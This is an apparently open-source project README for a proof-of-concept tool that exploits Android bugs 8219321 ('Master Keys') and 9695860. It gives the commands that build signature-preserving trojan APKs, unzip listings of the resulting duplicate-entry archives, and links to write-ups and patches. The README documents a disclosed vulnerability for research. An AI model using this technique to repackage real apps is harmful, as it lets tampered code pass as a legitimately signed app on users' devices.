Zip File Arbitrage AKA Android Master Keys
===================

This project includes a proof of concept for Android bug 8219321 as well as bug 9695860. Jay Saurik found a very nice way to utilize bug 9695860. He describes it far better than I could [here](http://www.saurik.com/id/18). I did not implement the advanced interleaving that he mentions here, but I did implement the ability to have more or less entries in the trojan app.  There are basically no limitations with this exploit.  In addition, this bug is patched on way less devices than AndroidMasterKeys.

The ```-b``` switch makes this tool use bug 9695860.

Run it as:
```
java -jar bin/AndroidMasterKeys.jar -b -a Orig.apk -z modifiedAPK.apk
```

The older bug deemed 'Android Master Keys' is described below:

This is a POC example for Android bug 8219321 (master keys):
  - [Well Written Explaination by Al Sutton](https://plus.google.com/113331808607528811927/posts/GxDA6111vYy)
  - [CyanogenMod Bug Report](https://jira.cyanogenmod.org/browse/CYAN-1602)
  - [CyanogenMod Patch](http://review.cyanogenmod.org/#/c/45251/)
  - [Blue Boxes' teaser of Blackhat talk](http://bluebox.com/corporate-blog/bluebox-uncovers-android-master-key/)
  - [POF's original POC](https://gist.github.com/poliva/36b0795ab79ad6f14fd8)
  - [Rekey.io - A Root framework patcher](http://www.rekey.io/)

Run it as:
```
java -jar bin/AndroidMasterKeys.jar -a Orig.apk -z modifiedAPK.apk
```

Please note that -most- ZIP libraries do not handle doing this properly.  UNIX zip's append will not allow file name collisions. It may be able to be done in Python, but it's default ZipFile append method only will add files in non-compressed.

The output from this [POC](https://gist.github.com/poliva/36b0795ab79ad6f14fd8) gives: 
```
➜  AndroidMasterKeys git:(master) unzip -vl pythonModdedApp.apk
Archive:  pythonModdedApp.apk
 Length   Method    Size  Ratio   Date   Time   CRC-32    Name
--------  ------  ------- -----   ----   ----   ------    ----
  506712  Defl:N   196197  61%  07-08-13 21:53  81ab41c8  classes.dex
    1664  Stored     1664   0%  07-08-13 21:51  db586380  AndroidManifest.xml
  506720  Stored   506720   0%  07-08-13 21:51  1fee85e8  classes.dex
     194  Stored      194   0%  07-08-13 21:51  463e5f86  library.properties
     776  Stored      776   0%  07-08-13 21:51  be507dd3  META-INF/CERT.RSA
     515  Stored      515   0%  07-08-13 21:51  1e40193c  META-INF/CERT.SF
     462  Stored      462   0%  07-08-13 21:51  de81958e  META-INF/MANIFEST.MF
     692  Stored      692   0%  07-08-13 21:51  d2d5c7bb  res/layout/main.xml
     856  Stored      856   0%  07-08-13 21:50  eac524bd  resources.arsc
    1761  Stored     1761   0%  07-08-13 21:51  e23c7570  rootdoc.txt
--------          -------  ---                            -------
 1020352           709837  30%                            10 files
 ```
 
 This tool takes proper care to not duplicate any files, while at the same time making sure that all 'appended' files are also compressed. 


 ```
unzip -vl AndroidMasterKeysModded.apk
Archive:  AndroidMasterKeysModded.apk
 Length   Method    Size  Ratio   Date   Time   CRC-32    Name
--------  ------  ------- -----   ----   ----   ------    ----
  506712  Defl:N   195600  61%  07-08-13 21:53  81ab41c8  classes.dex
     692  Defl:N      311  55%  07-08-13 21:51  d2d5c7bb  res/layout/main.xml
    1664  Defl:N      621  63%  07-08-13 21:51  db586380  AndroidManifest.xml
     856  Stored      856   0%  07-08-13 21:50  eac524bd  resources.arsc
  506720  Defl:N   190564  62%  07-08-13 21:51  1fee85e8  classes.dex
     194  Defl:N      144  26%  07-08-13 21:51  463e5f86  library.properties
    1761  Defl:N      741  58%  07-08-13 21:51  e23c7570  rootdoc.txt
     462  Defl:N      298  36%  07-08-13 21:51  de81958e  META-INF/MANIFEST.MF
     515  Defl:N      330  36%  07-08-13 21:51  1e40193c  META-INF/CERT.SF
     776  Defl:N      604  22%  07-08-13 21:51  be507dd3  META-INF/CERT.RSA
--------          -------  ---                            -------
 1020352           390069  62%                            10 files
 ```
 
To hack on the project download SBT run the following to build a jar:
```
sbt assembly
```
You can also add the gen-idea plugin and generate IntelliJ project files as well.
